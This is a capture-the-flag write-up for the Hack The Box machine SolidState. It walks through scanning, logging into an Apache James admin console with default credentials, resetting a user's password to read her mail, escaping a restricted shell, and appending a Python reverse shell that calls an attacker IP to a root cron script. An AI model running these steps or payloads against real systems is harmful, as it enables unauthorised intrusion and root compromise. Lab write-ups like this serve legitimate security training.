# Hack The Box: SolidState

**Difficulty:** Medium
**OS:** Linux

SolidState is a Medium-level Linux machine focused on exploiting a known remote code execution (RCE) vulnerability in an outdated email service (Apache James) and identifying system misconfigurations. The initial compromise requires analyzing an unsecured POP3 service to access sensitive internal communications, followed by exploiting the James server's management interface to gain shell access. Privilege escalation involves manipulating a custom Python script running as root via a scheduled task.

---

## Reconnaissance

The assessment begins with an Nmap scan to enumerate the available network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.51
nmap -p 22,80,110,119,4555 -sCV 10.10.10.51
```

The scan reveals several open ports indicating web and email infrastructure:
*   **Port 22:** SSH (OpenSSH 7.4p1 Debian)
*   **Port 80:** HTTP (Apache httpd 2.4.25)
*   **Port 110:** POP3 (Apache James pop3d 2.3.2)
*   **Port 119:** NNTP (Apache James nntpd 2.3.2)
*   **Port 4555:** RSYNC (JAMES Remote Admin 2.3.2)

Navigating to port 80 displays a static HTML5UP template for a security firm named "Solid State Security." The site provides no interactive features or dynamic content. We must focus our efforts on the Apache James services.

## Application Analysis & Initial Access

### Exploiting Apache James 2.3.2

Apache James is a Java-based mail server. Version 2.3.2 is notoriously vulnerable to a Remote Command Execution flaw (CVE-2015-7611). The vulnerability exists within the default administrative interface listening on port 4555.

When an administrator configures a user to execute an external command upon receiving an email (using the `sed` mechanism or `exec` in `.forward` style files), James fails to properly sanitize the input. This allows an attacker with access to the management console to modify user configurations and inject arbitrary shell commands that will execute when an email is delivered to that user.

First, we must access the administrative console. The default credentials for Apache James 2.3.2 are often `root:root`.

```bash
nc 10.10.10.51 4555
```

The server prompts for login:
```text
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

We have successfully authenticated to the management interface. We list the available users to identify potential targets.

```text
listusers
Existing accounts 5
user: mindy
user: mailadmin
user: james
user: thomas
user: john
```

Before attempting RCE, we should inspect the users' mailboxes to gather intelligence. The management console allows us to change user passwords without knowing their current ones.

We reset the password for the user `mindy` (or any other user):

```text
setpassword mindy newpassword
```

### Enumerating Email Communications

With Mindy's password reset, we connect to the POP3 service on port 110 to read her emails.

```bash
nc 10.10.10.51 110
```

We authenticate using the POP3 protocol commands:
```text
USER mindy
PASS newpassword
LIST
RETR 1
```

Reading Mindy's emails reveals an internal communication containing SSH credentials assigned to her account.

```text
Dear Mindy,
Your new SSH login credentials are:
Username: mindy
Password: <Discovered_Password>
```

We use these credentials to authenticate via SSH.

```bash
ssh mindy@10.10.10.51
# Authentication successful
```
We retrieve the `user.txt` flag from Mindy's home directory.

## Lateral Movement

Our SSH session as `mindy` places us in a restricted shell (rbash).

```bash
mindy@solidstate:~$ id
-rbash: id: command not found
```

We must break out of this restricted environment to properly enumerate the system. Because we authenticated via SSH, we can bypass `rbash` by requesting a specific shell (like `/bin/bash` or `/bin/sh`) during the SSH connection process using the `-t` flag, or by using shell escapes like invoking Python or vi if they are available.

```bash
ssh mindy@10.10.10.51 -t "bash --noprofile"
```

The SSH connection succeeds, bypassing the profile script that sets up `rbash`. We now have a fully functional shell.

*(Alternatively, if we had exploited the James RCE vulnerability via the `setforwarding` command, the resulting reverse shell would bypass the SSH restrictions entirely.)*

## Privilege Escalation

Enumerating the system as `mindy`, we analyze running processes and system configurations using a tool like `pspy`. We observe a Python script executing periodically as the `root` user.

```bash
# Monitoring processes...
UID=0    PID=1234   /usr/bin/python /opt/tmp.py
```

### Abusing Scheduled Tasks

We investigate the `/opt/tmp.py` script.

```bash
ls -la /opt/tmp.py
cat /opt/tmp.py
```

The output reveals that the script is owned by `root`, but it has weak file permissions allowing world-write access (e.g., `-rwxrwxrwx`).

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

The script is a simple cleanup utility designed to empty the `/tmp` directory. Because any user on the system can modify this file, we can inject malicious Python code that will be executed with root privileges when the cron job triggers.

We append a reverse shell payload to the end of the script.

```bash
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.X',9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" >> /opt/tmp.py
```

We start a Netcat listener on our attacking machine.

```bash
nc -lnvp 9999
```

When the scheduled task executes `/opt/tmp.py`, our injected payload establishes a reverse connection.

```bash
# Connection received
id
# uid=0(root) gid=0(root) groups=0(root)
```

The system is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
